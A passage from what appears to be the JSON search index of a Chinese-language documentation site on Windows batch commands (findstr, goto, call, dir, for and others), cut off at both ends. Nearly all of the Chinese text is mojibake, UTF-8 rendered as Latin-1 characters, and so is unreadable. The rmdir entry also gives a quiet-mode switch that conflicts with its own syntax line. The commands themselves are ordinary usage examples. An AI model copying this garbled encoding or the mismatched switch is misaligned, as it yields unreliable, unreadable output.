/<xyz å­—ä½ç½®: å­—çš„å¼€å§‹ xyz/> å­—ä½ç½®: å­—çš„ç»“æŸ å¤šä¸ªæœç´¢æ¡ä»¶ä½¿ç”¨ç©ºæ ¼éš”å¼€, å¦‚åˆ—å‡ºå½“å‰ç›®å½•ä¸‹, é . å¼€å¤´, ä¸ä»¥ music æˆ–è€… video å¼€å¤´çš„ç»“æœ: dir /b | findstr /v /i \"\\. music video\"","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Findstr.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Findstr.html"},{"title":"goto","text":"å°† cmd.exe å®šå‘åˆ°æ‰¹å¤„ç†ç¨‹åºä¸­å¸¦æ ‡ç­¾çš„è¡Œã€‚ GOTO label label æŒ‡å®šæ‰¹å¤„ç†ç¨‹åºä¸­ç”¨ä½œæ ‡ç­¾çš„æ–‡å­—å­—ç¬¦ä¸²ã€‚ æ ‡ç­¾å¿…é¡»å•ç‹¬ä¸€è¡Œï¼Œå¹¶ä¸”ä»¥å†’å·æ‰“å¤´ã€‚ ä¾‹: if %1 == 1 ( goto do1 ) else ( goto done ) :do1 echo 1 :done echo done å®é™…ä½¿ç”¨: if %1 == 1 ( goto do1 ) else ( goto done ) ä¹Ÿå¯ä»¥, ä¸çŸ¥é“ä¸ºå•¥. å¦‚æœå‘½ä»¤æ‰©å±•è¢«å¯ç”¨ï¼ŒGOTO ä¼šå¦‚ä¸‹æ”¹å˜: GOTO å‘½ä»¤ç°åœ¨æ¥å—ç›®æ ‡æ ‡ç­¾ :EOFï¼Œè¿™ä¸ªæ ‡ç­¾å°†æ§åˆ¶è½¬ç§»åˆ°å½“å‰æ‰¹è„šæœ¬æ–‡ä»¶çš„ç»“å°¾ã€‚ ä¸å®šä¹‰å°±é€€å‡ºæ‰¹è„šæœ¬æ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªå®¹æ˜“çš„åŠæ³•ã€‚ æœ‰å…³èƒ½ä½¿è¯¥åŠŸèƒ½æœ‰ç”¨çš„ CALL å‘½ä»¤çš„æ‰©å±•æè¿°ï¼Œè¯·é”®å…¥CALL /?ã€‚ çœ‹åˆ°æœ‰ç§è¯´æ³•æ˜¯: rem goto:eof ç›¸å½“äºå‡½æ•°çš„} ç»“å°¾æ ‡è®°ï¼Œè¿”å›åˆ°è°ƒç”¨è€…ä½ç½®, å¦‚æœæ²¡æœ‰è°ƒç”¨è€…ç›´æ¥å°±åˆ°æœ«å°¾ç»“æŸäº† rem exit /b 0 ç»“æŸå½“å‰cmdï¼Œè¿”å›exitCode 0","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-GOTO.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-GOTO.html"},{"title":"popd","text":"æ›´æ”¹åˆ° PUSHD å‘½ä»¤: /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/pushd å­˜å‚¨çš„ç›®å½•: POPD å¦‚æœå‘½ä»¤æ‰©å±•è¢«å¯ç”¨ï¼Œä»æ¨ç›®å½•å †æ ˆ POPD é©±åŠ¨å™¨æ—¶ï¼ŒPOPDå‘½ä»¤ä¼šåˆ é™¤ PUSHD åˆ›å»ºçš„ä¸´æ—¶é©±åŠ¨å™¨å·ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-POPD.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-POPD.html"},{"title":"rmdir","text":"åˆ é™¤ä¸€ä¸ªç›®å½• è¯­æ³•: RMDIR [/S] [/Q] [drive:]path RD [/S] [/Q] [drive:]path é€‰é¡¹: /S é€’å½’åˆ é™¤, ç”¨äºåˆ é™¤ç›®å½•æ ‘. ç±»ä¼¼äº linux rm çš„ -r /D å®‰é™æ¨¡å¼. ç±»ä¼¼äº linux rm çš„ -f æ³¨è§£ å¤§å°å†™ä¸æ•æ„Ÿ, å¦‚: rmdir /s xx","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-RMDIR.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-RMDIR.html"},{"title":"assoc","text":"æ˜¾ç¤ºæˆ–ä¿®æ”¹æ–‡ä»¶æ‰©å±•åå…³è”: ASSOC [.ext[=[fileType]]] .ext æŒ‡å®šè·Ÿæ–‡ä»¶ç±»å‹å…³è”çš„æ–‡ä»¶æ‰©å±•å fileType æŒ‡å®šè·Ÿæ–‡ä»¶æ‰©å±•åå…³è”çš„æ–‡ä»¶ç±»å‹ é”®å…¥ ASSOC è€Œä¸å¸¦å‚æ•°ï¼Œæ˜¾ç¤ºå½“å‰æ–‡ä»¶å…³è”ã€‚ å¦‚æœåªç”¨æ–‡ä»¶æ‰©å±•åè°ƒç”¨ ASSOCï¼Œåˆ™æ˜¾ç¤ºé‚£ä¸ªæ–‡ä»¶æ‰©å±•åçš„å½“å‰æ–‡ä»¶å…³è”ã€‚ å¦‚æœä¸ä¸ºæ–‡ä»¶ç±»å‹æŒ‡å®šä»»ä½•å‚æ•°ï¼Œå‘½ä»¤ä¼šåˆ é™¤æ–‡ä»¶æ‰©å±•åçš„å…³è”ã€‚ æ³¨è§£ assoc è®¾ç½® æ–‡ä»¶æ‰©å±•åå…³è”, å…³è”åˆ°'æ–‡ä»¶ç±»å‹' ä¸ /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/ftype è®¾ç½®æ–‡ä»¶ç±»å‹å…³è”, å…³è”åˆ°'æ‰§è¡Œç¨‹åºå’Œå‚æ•°' ç±»ä¼¼","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-assoc.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-assoc.html"},{"title":"call","text":"ä»æ‰¹å¤„ç†ç¨‹åºè°ƒç”¨å¦ä¸€ä¸ªæ‰¹å¤„ç†ç¨‹åº: CALL [drive:][path]filename [batch-parameters] batch-parameters æŒ‡å®šæ‰¹å¤„ç†ç¨‹åºæ‰€éœ€çš„å‘½ä»¤è¡Œä¿¡æ¯ã€‚ å¦‚æœå‘½ä»¤æ‰©å±•è¢«å¯ç”¨ï¼ŒCALL ä¼šå¦‚ä¸‹æ”¹å˜: CALL å‘½ä»¤ç°åœ¨å°†å·æ ‡å½“ä½œ CALL çš„ç›®æ ‡æ¥å—ã€‚è¯­æ³•æ˜¯: CALL:label arguments ä¸€ä¸ªæ–°çš„æ‰¹æ–‡ä»¶ä¸Šä¸‹æ–‡ç”±æŒ‡å®šçš„å‚æ•°æ‰€åˆ›å»ºï¼Œæ§åˆ¶åœ¨å·æ ‡è¢«æŒ‡å®šåä¼ é€’åˆ°è¯­å¥ã€‚ ä½ å¿…é¡»é€šè¿‡è¾¾åˆ°æ‰¹è„šæœ¬æ–‡ä»¶æœ«ä¸¤æ¬¡æ¥ \"exit\" ä¸¤æ¬¡ã€‚ ç¬¬ä¸€æ¬¡è¯»åˆ°æ–‡ä»¶æœ«æ—¶ï¼Œæ§åˆ¶ä¼šå›åˆ° CALL è¯­å¥çš„ç´§åé¢ã€‚ ç¬¬äºŒæ¬¡ä¼šé€€å‡ºæ‰¹è„šæœ¬ã€‚ é”®å…¥ GOTO /?ï¼Œå‚çœ‹ GOTO :EOF æ‰©å±•çš„æè¿°ï¼Œæ­¤æè¿°å…è®¸ä½ ä»ä¸€ä¸ªæ‰¹è„šæœ¬è¿”å›ã€‚ å¦å¤–ï¼Œæ‰¹è„šæœ¬æ–‡æœ¬å‚æ•°å‚ç…§(%0ã€%1ã€ç­‰ç­‰)å·²å¦‚ä¸‹æ”¹å˜: æ‰¹è„šæœ¬é‡Œçš„ %* æŒ‡å‡ºæ‰€æœ‰çš„å‚æ•°(å¦‚ %1 %2 %3 %4 %5 ...) æ‰¹å‚æ•°(%n)çš„æ›¿ä»£å·²è¢«å¢å¼ºã€‚ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­æ³•: %~1 - åˆ é™¤å¼•å·(\")ï¼Œæ‰©å±• %1 %~f1 - å°† %1 æ‰©å±•åˆ°ä¸€ä¸ªå®Œå…¨åˆæ ¼çš„è·¯å¾„å %~d1 - ä»…å°† %1 æ‰©å±•åˆ°ä¸€ä¸ªé©±åŠ¨å™¨å· %~p1 - ä»…å°† %1 æ‰©å±•åˆ°ä¸€ä¸ªè·¯å¾„ %~n1 - ä»…å°† %1 æ‰©å±•åˆ°ä¸€ä¸ªæ–‡ä»¶å %~x1 - ä»…å°† %1 æ‰©å±•åˆ°ä¸€ä¸ªæ–‡ä»¶æ‰©å±•å %~s1 - æ‰©å±•çš„è·¯å¾„åªå«æœ‰çŸ­å %~a1 - å°† %1 æ‰©å±•åˆ°æ–‡ä»¶å±æ€§ %~t1 - å°† %1 æ‰©å±•åˆ°æ–‡ä»¶çš„æ—¥æœŸ/æ—¶é—´ %~z1 - å°† %1 æ‰©å±•åˆ°æ–‡ä»¶çš„å¤§å° %~$PATH:1 - æŸ¥æ‰¾åˆ—åœ¨ PATH ç¯å¢ƒå˜é‡çš„ç›®å½•ï¼Œå¹¶å°† %1 æ‰©å±•åˆ°æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå®Œå…¨åˆæ ¼çš„åç§°ã€‚å¦‚æœ ç¯å¢ƒå˜é‡åæœªè¢«å®šä¹‰ï¼Œæˆ–è€…æ²¡æœ‰æ‰¾åˆ°æ–‡ä»¶ï¼Œ æ­¤ä¿®æ”¹ç¬¦ä¼šæ‰©å±•åˆ°ç©ºå­—ç¬¦ä¸² å¯ä»¥ç»„åˆä¿®æ”¹ç¬¦æ¥å–å¾—å¤šé‡ç»“æœ: %~dp1 - åªå°† %1 æ‰©å±•åˆ°é©±åŠ¨å™¨å·å’Œè·¯å¾„ %~nx1 - åªå°† %1 æ‰©å±•åˆ°æ–‡ä»¶åå’Œæ‰©å±•å %~dp$PATH:1 - åœ¨åˆ—åœ¨ PATH ç¯å¢ƒå˜é‡ä¸­çš„ç›®å½•é‡ŒæŸ¥æ‰¾ %1ï¼Œ å¹¶æ‰©å±•åˆ°æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶çš„é©±åŠ¨å™¨å·å’Œè·¯å¾„ã€‚ %~ftza1 - å°† %1 æ‰©å±•åˆ°ç±»ä¼¼ DIR çš„è¾“å‡ºè¡Œã€‚ åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œ%1 å’Œ PATH å¯ä»¥è¢«å…¶ä»–æœ‰æ•ˆæ•°å€¼æ›¿æ¢ã€‚ %~ è¯­æ³•è¢«ä¸€ä¸ªæœ‰æ•ˆå‚æ•°å·ç ç»ˆæ­¢ã€‚%~ ä¿®å®šç¬¦ä¸èƒ½è·Ÿ %* ä½¿ç”¨ æ­¤å¤„æä¸€ä¸‹ä¸ /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/start çš„åŒºåˆ«: startçš„è°ƒç”¨éœ€è¦åœ¨è°ƒç”¨çš„batè„šæœ¬å†…å†™å…¥ exit æ‰èƒ½æ­£å¸¸è¿”å›å½“å‰batæŒ‡ä»¤ call çš„é€€å‡ºæœ‰æ²¡æœ‰ exit /b å³å¯, é»˜è®¤å°±æ˜¯è¿™ä¸ª å¦‚, 1.bat è°ƒç”¨ 2.bat , ä½¿ç”¨ start: ä½¿ç”¨ call: è¾“å‡ºéƒ½æ˜¯: C:\\Users\\çƒŸé›€\\Desktop\\some\\t\\_>1.bat end 0 end 1 C:\\Users\\çƒŸé›€\\Desktop\\some\\t\\_> ä½¿ç”¨callæ—¶, åœ¨ 2.bat ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/exit ä¼šé€€å‡ºæ•´ä¸ªç¨‹åº, å› ä¸º, call æ˜¯åœ¨ä¸€ä¸ªæ‰¹å¤„ç†ä¸­ç›´æ¥è°ƒç”¨å¦ä¸€ä¸ªæ‰¹å¤„ç†, ä¸ä¼šæ‰“å¼€æ–°çš„çª—å£. è€Œ start æ˜¯æ–°å¼€ä¸€ä¸ªçª—å£, æ‰€ä»¥éœ€è¦åœ¨æ–°å¼€çš„çª—å£æ‰‹åŠ¨ exit é€€å‡º. è¦å¤„ç†callæ‰§è¡Œå­è„šæœ¬é€€å‡ºçˆ¶è„šæœ¬å¯ä»¥ä½¿ç”¨: goto :eof æ¥æ›¿ä»£, è¡¨ç¤ºè½¬åˆ°æ–‡ä»¶æœ«å°¾","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-call.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-call.html"},{"title":"color","text":"è®¾ç½®é»˜è®¤çš„æ§åˆ¶å°å‰æ™¯å’ŒèƒŒæ™¯é¢œè‰²: COLOR [attr] attr æŒ‡å®šæ§åˆ¶å°è¾“å‡ºçš„é¢œè‰²å±æ€§ã€‚ é¢œè‰²å±æ€§ç”±ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—æŒ‡å®š: ç¬¬ä¸€ä¸ªå¯¹åº”äºèƒŒæ™¯ ç¬¬äºŒä¸ªå¯¹åº”äºå‰æ™¯ æ¯ä¸ªæ•°å­—å¯ä»¥ä¸ºä»¥ä¸‹ä»»ä½•å€¼: 0 = é»‘è‰² 8 = ç°è‰² 1 = è“è‰² 9 = æ·¡è“è‰² 2 = ç»¿è‰² A = æ·¡ç»¿è‰² 3 = æµ…ç»¿è‰² B = æ·¡æµ…ç»¿è‰² 4 = çº¢è‰² C = æ·¡çº¢è‰² 5 = ç´«è‰² D = æ·¡ç´«è‰² 6 = é»„è‰² E = æ·¡é»„è‰² 7 = ç™½è‰² F = äº®ç™½è‰² å¦‚æœæ²¡æœ‰ç»™å®šä»»ä½•å‚æ•°ï¼Œæ­¤å‘½ä»¤ä¼šå°†é¢œè‰²è¿˜åŸåˆ° CMD.EXE å¯åŠ¨æ—¶çš„é¢œè‰²ã€‚ è¿™ä¸ªå€¼æ¥è‡ªå½“å‰æ§åˆ¶å°çª—å£ã€/T å‘½ä»¤è¡Œå¼€å…³æˆ– DefaultColor æ³¨å†Œè¡¨å€¼ã€‚ å¦‚æœå°è¯•ä½¿ç”¨ç›¸åŒçš„å‰æ™¯å’ŒèƒŒæ™¯é¢œè‰²æ¥æ‰§è¡ŒCOLOR å‘½ä»¤ï¼ŒCOLOR å‘½ä»¤ä¼šå°† ERRORLEVEL è®¾ç½®ä¸º 1ã€‚ ç¤ºä¾‹: \"COLOR fc\" åœ¨äº®ç™½è‰²ä¸Šäº§ç”Ÿæ·¡çº¢è‰²","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-coloror.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-coloror.html"},{"title":"dir","text":"æ˜¾ç¤ºç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•åˆ—è¡¨: DIR [drive:][path][filename] [/A[[:]attributes]] [/B] [/C] [/D] [/L] [/N] [/O[[:]sortorder]] [/P] [/Q] [/R] [/S] [/T[[:]timefield]] [/W] [/X] [/4] é€‰é¡¹: [drive:][path][filename] æŒ‡å®šè¦åˆ—å‡ºçš„é©±åŠ¨å™¨ã€ç›®å½•å’Œ/æˆ–æ–‡ä»¶ã€‚ /A æ˜¾ç¤ºå…·æœ‰æŒ‡å®šå±æ€§çš„æ–‡ä»¶ã€‚ å±æ€§ D ç›®å½• R åªè¯»æ–‡ä»¶ H éšè—æ–‡ä»¶ A å‡†å¤‡å­˜æ¡£çš„æ–‡ä»¶ S ç³»ç»Ÿæ–‡ä»¶ I æ— å†…å®¹ç´¢å¼•æ–‡ä»¶ L é‡æ–°åˆ†æç‚¹ O è„±æœºæ–‡ä»¶ - è¡¨ç¤º\"å¦\"çš„å‰ç¼€ /B ä½¿ç”¨ç©ºæ ¼å¼(æ²¡æœ‰æ ‡é¢˜ä¿¡æ¯æˆ–æ‘˜è¦)ã€‚ /C åœ¨æ–‡ä»¶å¤§å°ä¸­æ˜¾ç¤ºåƒä½æ•°åˆ†éš”ç¬¦ã€‚è¿™æ˜¯é»˜è®¤å€¼ã€‚ç”¨ /-C æ¥ ç¦ç”¨åˆ†éš”ç¬¦æ˜¾ç¤ºã€‚ /D è·Ÿå®½å¼ç›¸åŒï¼Œä½†æ–‡ä»¶æ˜¯æŒ‰æ åˆ†ç±»åˆ—å‡ºçš„ã€‚ /L ç”¨å°å†™ã€‚ /N æ–°çš„é•¿åˆ—è¡¨æ ¼å¼ï¼Œå…¶ä¸­æ–‡ä»¶ååœ¨æœ€å³è¾¹ã€‚ /O ç”¨åˆ†ç±»é¡ºåºåˆ—å‡ºæ–‡ä»¶ã€‚ æ’åˆ—é¡ºåº N æŒ‰åç§°(å­—æ¯é¡ºåº) S æŒ‰å¤§å°(ä»å°åˆ°å¤§) E æŒ‰æ‰©å±•å(å­—æ¯é¡ºåº) D æŒ‰æ—¥æœŸ/æ—¶é—´(ä»å…ˆåˆ°å) G ç»„ç›®å½•ä¼˜å…ˆ - åè½¬é¡ºåºçš„å‰ç¼€ /P åœ¨æ¯ä¸ªä¿¡æ¯å±å¹•åæš‚åœã€‚ /Q æ˜¾ç¤ºæ–‡ä»¶æ‰€æœ‰è€…ã€‚ /R æ˜¾ç¤ºæ–‡ä»¶çš„å¤‡ç”¨æ•°æ®æµã€‚ /S æ˜¾ç¤ºæŒ‡å®šç›®å½•å’Œæ‰€æœ‰å­ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚ /T æ§åˆ¶æ˜¾ç¤ºæˆ–ç”¨æ¥åˆ†ç±»çš„æ—¶é—´å­—ç¬¦åŸŸ æ—¶é—´æ®µ C åˆ›å»ºæ—¶é—´ A ä¸Šæ¬¡è®¿é—®æ—¶é—´ W ä¸Šæ¬¡å†™å…¥çš„æ—¶é—´ /W ç”¨å®½åˆ—è¡¨æ ¼å¼ã€‚ /X æ˜¾ç¤ºä¸ºé 8dot3 æ–‡ä»¶åäº§ç”Ÿçš„çŸ­åç§°ã€‚æ ¼å¼æ˜¯ /N çš„æ ¼å¼ï¼Œ çŸ­åç§°æ’åœ¨é•¿åç§°å‰é¢ã€‚å¦‚æœæ²¡æœ‰çŸ­åç§°ï¼Œåœ¨å…¶ä½ç½®åˆ™ æ˜¾ç¤ºç©ºç™½ã€‚ /4 ä»¥å››ä½æ•°å­—æ˜¾ç¤ºå¹´ä»½ å¯ä»¥åœ¨ DIRCMD ç¯å¢ƒå˜é‡ä¸­é¢„å…ˆè®¾å®šå¼€å…³ã€‚é€šè¿‡æ·»åŠ å‰ç¼€ - (ç ´æŠ˜å·) æ¥æ›¿ä»£é¢„å…ˆè®¾å®šçš„å¼€å…³ã€‚ä¾‹å¦‚ï¼Œ/-Wã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-dir.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-dir.html"},{"title":"exit","text":"å¯ä»¥æŸ¥å¸®åŠ©æ–‡æ¡£: exit /? é€€å‡ºCMD.EXEç¨‹åºæˆ–è€…å½“å‰è§£é‡Šå™¨ EXIT [/B] [exitCode] /B æŒ‡å®šè¦é€€å‡ºå½“å‰æ‰¹å¤„ç†è„šæœ¬è€Œä¸æ˜¯ CMD.EXEã€‚å¦‚æœä»ä¸€ä¸ª æ‰¹å¤„ç†è„šæœ¬å¤–æ‰§è¡Œï¼Œåˆ™ä¼šé€€å‡º CMD.EXE exitCode æŒ‡å®šä¸€ä¸ªæ•°å­—å·ç ã€‚å¦‚æœæŒ‡å®šäº† /Bï¼Œå°† ERRORLEVEL è®¾æˆé‚£ä¸ªæ•°å­—ã€‚å¦‚æœé€€å‡º CMD.EXEï¼Œåˆ™ç”¨é‚£ä¸ªæ•°å­—è®¾ç½® è¿‡ç¨‹é€€å‡ºä»£ç ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-exit.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-exit.html"},{"title":"find","text":"åœ¨æ–‡ä»¶ä¸­æœç´¢å­—ç¬¦ä¸²: FIND [/V] [/C] [/N] [/I] [/OFF[LINE]] \"string\" [[drive:][path]filename[ ...]] é€‰é¡¹: /V æ˜¾ç¤ºæ‰€æœ‰æœªåŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„è¡Œã€‚ /C ä»…æ˜¾ç¤ºåŒ…å«å­—ç¬¦ä¸²çš„è¡Œæ•°ã€‚ /N æ˜¾ç¤ºè¡Œå·ã€‚ /I æœç´¢å­—ç¬¦ä¸²æ—¶å¿½ç•¥å¤§å°å†™ã€‚ /OFF[LINE] ä¸è¦è·³è¿‡å…·æœ‰è„±æœºå±æ€§é›†çš„æ–‡ä»¶ã€‚ \"string\" æŒ‡å®šè¦æœç´¢çš„æ–‡æœ¬å­—ç¬¦ä¸²ã€‚ [drive:][path]filename æŒ‡å®šè¦æœç´¢çš„æ–‡ä»¶ã€‚ å¦‚æœæ²¡æœ‰æŒ‡å®šè·¯å¾„ï¼ŒFIND å°†æœç´¢åœ¨æç¤ºç¬¦å¤„é”®å…¥ çš„æ–‡æœ¬æˆ–è€…ç”±å¦ä¸€å‘½ä»¤äº§ç”Ÿçš„æ–‡æœ¬ã€‚ ä½†æ˜¯å®é™…ä½¿ç”¨, æ„Ÿè§‰ dir | find /c /v æ›´åƒæ˜¯æ‰“å°æ‰€æœ‰è¡Œ ç»Ÿè®¡è¡Œæ•°, æ¯”å¦‚æŸ¥æ‰¾çš„pythonè¿›ç¨‹çš„ä¸ªæ•°: tasklist | findstr /I \"python\" | find /c /v \"\"","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-find.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-find.html"},{"title":"for","text":"å¾ªç¯: C:\\Users\\çƒŸé›€>for /? å¯¹ä¸€ç»„æ–‡ä»¶ä¸­çš„æ¯ä¸€ä¸ªæ–‡ä»¶æ‰§è¡ŒæŸä¸ªç‰¹å®šå‘½ä»¤: FOR %variable IN (set) DO command [command-parameters] %variable æŒ‡å®šä¸€ä¸ªå•ä¸€å­—æ¯å¯æ›¿æ¢çš„å‚æ•°ã€‚ (set) æŒ‡å®šä¸€ä¸ªæˆ–ä¸€ç»„æ–‡ä»¶ã€‚å¯ä»¥ä½¿ç”¨é€šé…ç¬¦ã€‚ command æŒ‡å®šå¯¹æ¯ä¸ªæ–‡ä»¶æ‰§è¡Œçš„å‘½ä»¤ã€‚ command-parameters ä¸ºç‰¹å®šå‘½ä»¤æŒ‡å®šå‚æ•°æˆ–å‘½ä»¤è¡Œå¼€å…³ã€‚ åœ¨æ‰¹å¤„ç†ç¨‹åºä¸­ä½¿ç”¨ FOR å‘½ä»¤æ—¶ï¼ŒæŒ‡å®šå˜é‡è¯·ä½¿ç”¨ %%variable è€Œä¸è¦ç”¨ %variableã€‚å˜é‡åç§°æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥ %i ä¸åŒäº %I. å¦‚æœå¯ç”¨å‘½ä»¤æ‰©å±•ï¼Œåˆ™ä¼šæ”¯æŒä¸‹åˆ— FOR å‘½ä»¤çš„å…¶ä»–æ ¼å¼: FOR /D %variable IN (set) DO command [command-parameters] å¦‚æœé›†ä¸­åŒ…å«é€šé…ç¬¦ï¼Œåˆ™æŒ‡å®šä¸ç›®å½•ååŒ¹é…ï¼Œè€Œä¸ä¸æ–‡ä»¶ååŒ¹é…ã€‚ FOR /R [[drive:]path] %variable IN (set) DO command [command-parameters] æ£€æŸ¥ä»¥ [drive:]path ä¸ºæ ¹çš„ç›®å½•æ ‘ï¼ŒæŒ‡å‘æ¯ä¸ªç›®å½•ä¸­çš„ FOR è¯­å¥ã€‚ å¦‚æœåœ¨ /R åæ²¡æœ‰æŒ‡å®šç›®å½•è§„èŒƒï¼Œåˆ™ä½¿ç”¨å½“å‰ç›®å½•ã€‚å¦‚æœé›†ä»…ä¸ºä¸€ä¸ªå•ç‚¹(.)å­—ç¬¦ï¼Œ åˆ™æšä¸¾è¯¥ç›®å½•æ ‘ã€‚ FOR /L %variable IN (start,step,end) DO command [command-parameters] è¯¥é›†è¡¨ç¤ºä»¥å¢é‡å½¢å¼ä»å¼€å§‹åˆ°ç»“æŸçš„ä¸€ä¸ªæ•°å­—åºåˆ—ã€‚å› æ­¤ï¼Œ(1,1,5)å°†äº§ç”Ÿåºåˆ— 1 2 3 4 5ï¼Œ(5,-1,1)å°†äº§ç”Ÿåºåˆ—(5 4 3 2 1) FOR /F [\"options\"] %variable IN (file-set) DO command [command-parameters] FOR /F [\"options\"] %variable IN (\"string\") DO command [command-parameters] FOR /F [\"options\"] %variable IN ('command') DO command [command-parameters] æˆ–è€…ï¼Œå¦‚æœæœ‰ usebackq é€‰é¡¹: FOR /F [\"options\"] %variable IN (file-set) DO command [command-parameters] FOR /F [\"options\"] %variable IN (\"string\") DO command [command-parameters] FOR /F [\"options\"] %variable IN ('command') DO command [command-parameters] ç®€è€Œè¨€ä¹‹å°±æ˜¯è¡¨ç¤ºè¡¨ç¤ºå¯»æ‰¾æ–‡ä»¶ fileset ä¸ºä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶åã€‚ç»§ç»­åˆ° fileset ä¸­çš„ä¸‹ä¸€ä¸ªæ–‡ä»¶ä¹‹å‰ï¼Œ æ¯ä»½æ–‡ä»¶éƒ½è¢«æ‰“å¼€ã€è¯»å–å¹¶ç»è¿‡å¤„ç†ã€‚å¤„ç†åŒ…æ‹¬è¯»å–æ–‡ä»¶ï¼Œå°†å…¶åˆ†æˆä¸€è¡Œè¡Œçš„æ–‡å­—ï¼Œ ç„¶åå°†æ¯è¡Œè§£ææˆé›¶æˆ–æ›´å¤šçš„ç¬¦å·ã€‚ç„¶åç”¨å·²æ‰¾åˆ°çš„ç¬¦å·å­—ç¬¦ä¸²å˜é‡å€¼è°ƒç”¨ For å¾ªç¯ã€‚ ä»¥é»˜è®¤æ–¹å¼ï¼Œ/F é€šè¿‡æ¯ä¸ªæ–‡ä»¶çš„æ¯ä¸€è¡Œä¸­åˆ†å¼€çš„ç¬¬ä¸€ä¸ªç©ºç™½ç¬¦å·ã€‚è·³è¿‡ç©ºç™½è¡Œã€‚ ä½ å¯é€šè¿‡æŒ‡å®šå¯é€‰ \"options\" å‚æ•°æ›¿ä»£é»˜è®¤è§£ææ“ä½œã€‚è¿™ä¸ªå¸¦å¼•å·çš„å­—ç¬¦ä¸²åŒ…æ‹¬ä¸€ä¸ª æˆ–å¤šä¸ªæŒ‡å®šä¸åŒè§£æé€‰é¡¹çš„å…³é”®å­—ã€‚è¿™äº›å…³é”®å­—ä¸º: eol=c - æŒ‡ä¸€ä¸ªè¡Œæ³¨é‡Šå­—ç¬¦çš„ç»“å°¾(å°±ä¸€ä¸ª) skip=n - æŒ‡åœ¨æ–‡ä»¶å¼€å§‹æ—¶å¿½ç•¥çš„è¡Œæ•°ã€‚ delims=xxx - æŒ‡åˆ†éš”ç¬¦é›†ã€‚è¿™ä¸ªæ›¿æ¢äº†ç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦çš„ é»˜è®¤åˆ†éš”ç¬¦é›†ã€‚ tokens=x,y,m-n - æŒ‡æ¯è¡Œçš„å“ªä¸€ä¸ªç¬¦å·è¢«ä¼ é€’åˆ°æ¯ä¸ªè¿­ä»£ çš„ for æœ¬èº«ã€‚è¿™ä¼šå¯¼è‡´é¢å¤–å˜é‡åç§°çš„åˆ†é…ã€‚m-n æ ¼å¼ä¸ºä¸€ä¸ªèŒƒå›´ã€‚é€šè¿‡ nth ç¬¦å·æŒ‡å®š mthã€‚å¦‚æœ ç¬¦å·å­—ç¬¦ä¸²ä¸­çš„æœ€åä¸€ä¸ªå­—ç¬¦æ˜Ÿå·ï¼Œ é‚£ä¹ˆé¢å¤–çš„å˜é‡å°†åœ¨æœ€åä¸€ä¸ªç¬¦å·è§£æä¹‹å åˆ†é…å¹¶æ¥å—è¡Œçš„ä¿ç•™æ–‡æœ¬ã€‚ usebackq - æŒ‡å®šæ–°è¯­æ³•å·²åœ¨ä¸‹ç±»æƒ…å†µä¸­ä½¿ç”¨: åœ¨ä½œä¸ºå‘½ä»¤æ‰§è¡Œä¸€ä¸ªåå¼•å·çš„å­—ç¬¦ä¸²å¹¶ä¸”ä¸€ä¸ªå• å¼•å·å­—ç¬¦ä¸ºæ–‡å­—å­—ç¬¦ä¸²å‘½ä»¤å¹¶å…è®¸åœ¨ file-set ä¸­ä½¿ç”¨åŒå¼•å·æ‰©èµ·æ–‡ä»¶åç§°ã€‚ æŸäº›èŒƒä¾‹å¯èƒ½æœ‰åŠ©: FOR /F \"eol=; tokens=2,3* delims=, \" %i in (myfile.txt) do @echo %i %j %k ä¼šåˆ†æ myfile.txt ä¸­çš„æ¯ä¸€è¡Œï¼Œå¿½ç•¥ä»¥åˆ†å·æ‰“å¤´çš„é‚£äº›è¡Œï¼Œå°† æ¯è¡Œä¸­çš„ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªç¬¦å·ä¼ é€’ç»™ for å‡½æ•°ä½“ï¼Œç”¨é€—å·å’Œ/æˆ– ç©ºæ ¼åˆ†éš”ç¬¦å·ã€‚è¯·æ³¨æ„ï¼Œæ­¤ for å‡½æ•°ä½“çš„è¯­å¥å¼•ç”¨ %i æ¥ 